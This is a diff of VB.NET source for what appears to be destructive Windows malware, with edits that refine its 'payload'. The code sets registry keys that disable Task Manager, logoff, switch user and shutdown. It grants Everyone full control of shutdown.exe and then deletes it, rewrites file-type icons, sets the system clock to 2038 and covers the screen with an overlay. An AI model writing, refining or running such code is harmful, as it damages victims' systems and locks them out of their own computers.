@@ -34,6 +34,9 @@ Public Class Form1
     ' Delegate for hook callback
     Private Delegate Function HookProc(nCode As Integer, wParam As IntPtr, lParam As IntPtr) As IntPtr
 
+    ' Class-level variable to hold the overlay instance
+    Private overlay As FullScreenOverlay
+
     ' Constructor
     Public Sub New()
         InitializeComponent()
@@ -427,8 +430,6 @@ Public Class Form1
             Using explorerRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(explorerRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                 ' Set NoLogoff key to 1 (disable Logoff)
                 explorerRegKey?.SetValue("NoLogoff", 1, RegistryValueKind.DWord)
-                ' Set HideFastUserSwitching key to 1 (disable Switch User)
-                explorerRegKey?.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord)
                 ' Set NoClose key to 1 (disable Shut Down/Restart)
                 explorerRegKey?.SetValue("NoClose", 1, RegistryValueKind.DWord)
             End Using
@@ -437,6 +438,8 @@ Public Class Form1
             Using systemRegKey As RegistryKey = Registry.CurrentUser.CreateSubKey(systemRegPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
                 ' Set DisableTaskMgr key to 1 (disable Task Manager)
                 systemRegKey?.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord)
+                ' Set HideFastUserSwitching key to 1 (disable Switch User)
+                systemRegKey?.SetValue("HideFastUserSwitching", 1, RegistryValueKind.DWord)
             End Using
 
         Catch ex As Exception
@@ -601,8 +604,6 @@ Public Class Form1
                 UpdateRegistryKey(Registry.ClassesRoot, regKey, iconPath)
             Next
 
-            MessageBox.Show("File icons updated successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
-
         Catch ex As Exception
             MessageBox.Show("An error occurred while updating file icons: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
         End Try
@@ -689,18 +690,27 @@ Public Class Form1
             Dim shutdownExePath As String = "C:\Windows\System32\shutdown.exe"
 
             ' Step 1: Kill any running instances of shutdown.exe
-            Dim killCmd As String = "taskkill /f /im shutdown.exe"
-            ExecuteCommand(killCmd)
-
+            Dim processes = Process.GetProcessesByName("shutdown")
+            For Each proc In processes
+                Try
+                    proc.Kill() ' Kill the process
+                    proc.WaitForExit() ' Wait for the process to exit
+                Catch ex As Exception
+                    MessageBox.Show("Could not kill process: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+                End Try
+            Next
 
             ' Step 2: Grant full access to shutdown.exe to ensure we can delete it
             Dim grantAccessCmd As String = $"icacls {shutdownExePath} /grant *S-1-1-0:(F)"
             ExecuteCommand(grantAccessCmd)
 
-
             ' Step 3: Delete shutdown.exe
-            Dim deleteCmd As String = $"del {shutdownExePath}"
-            ExecuteCommand(deleteCmd)
+            If File.Exists(shutdownExePath) Then
+                File.Delete(shutdownExePath)
+                MessageBox.Show("shutdown.exe deleted successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
+            Else
+                MessageBox.Show("shutdown.exe not found.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+            End If
 
         Catch ex As Exception
             MessageBox.Show("An error occurred: " & ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
@@ -903,6 +913,8 @@ Public Class Form1
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
 
+            CreateEpicVBScriptFile()
+
             ' Start the operations in a new thread
             Dim thread As New Thread(AddressOf ExecutePayload)
             thread.Start()
@@ -913,12 +925,13 @@ Public Class Form1
 
     ' Method to execute the payload in a separate thread
     Private Sub ExecutePayload()
-        ' Apply the portal effect after setting the system time
-        Dim overlay As New FullScreenOverlay()
-        overlay.Show()
+        ' Check if the overlay is disposed or null, and create a new instance if needed
+        If overlay Is Nothing OrElse overlay.IsDisposed Then
+            overlay = New FullScreenOverlay()
+            overlay.Show()
+        End If
 
         ' Execute remaining operations
-        CreateEpicVBScriptFile()
         WriteMessageToNotepad()
         GrantSelfPermissions()
         animationTimer.Start()
